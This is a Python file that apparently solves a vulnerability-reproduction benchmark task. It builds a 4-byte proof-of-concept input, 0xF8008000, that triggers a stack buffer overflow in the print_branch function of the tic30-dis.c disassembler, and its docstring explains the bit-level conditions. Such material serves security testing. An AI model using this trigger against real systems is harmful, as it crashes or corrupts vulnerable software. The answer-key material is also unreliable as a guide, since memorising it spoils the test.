class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a stack buffer overflow in tic30-dis.c.

        The vulnerability exists in the `print_branch` function where a local
        array `char operand[4][8]` is used to store operand strings. The code
        can be manipulated to process up to 8 operands, causing an out-of-bounds
        write on the stack for the 5th operand and onwards.

        To trigger this, a crafted 32-bit instruction must:
        1. Be recognized as a 32-bit instruction. The disassembler checks if bit 15
           of the instruction word is set.
        2. Be a branch instruction to invoke `print_branch`. Opcodes 0x7c-0x7f
           (in bits 31-25) are branch instructions.
        3. Specify a number of operands that will cause an overflow. If bits 24-22
           of the instruction word are zero, the number of operands is set to 8.

        We construct an instruction satisfying these conditions:
        - Opcode (bits 31-25) = 0x7c
        - Operand count bits (24-22) = 0
        - 32-bit instruction flag (bit 15) = 1

        This results in the 32-bit integer `0xF8008000`.
        The PoC is this integer represented as 4 little-endian bytes.
        """
        
        # Instruction word that triggers the vulnerability.
        # (0x7c << 25) | (1 << 15) = 0xF8000000 | 0x8000 = 0xF8008000
        insn = 0xF8008000
        
        # Convert the integer to a 4-byte little-endian sequence.
        return insn.to_bytes(4, byteorder='little')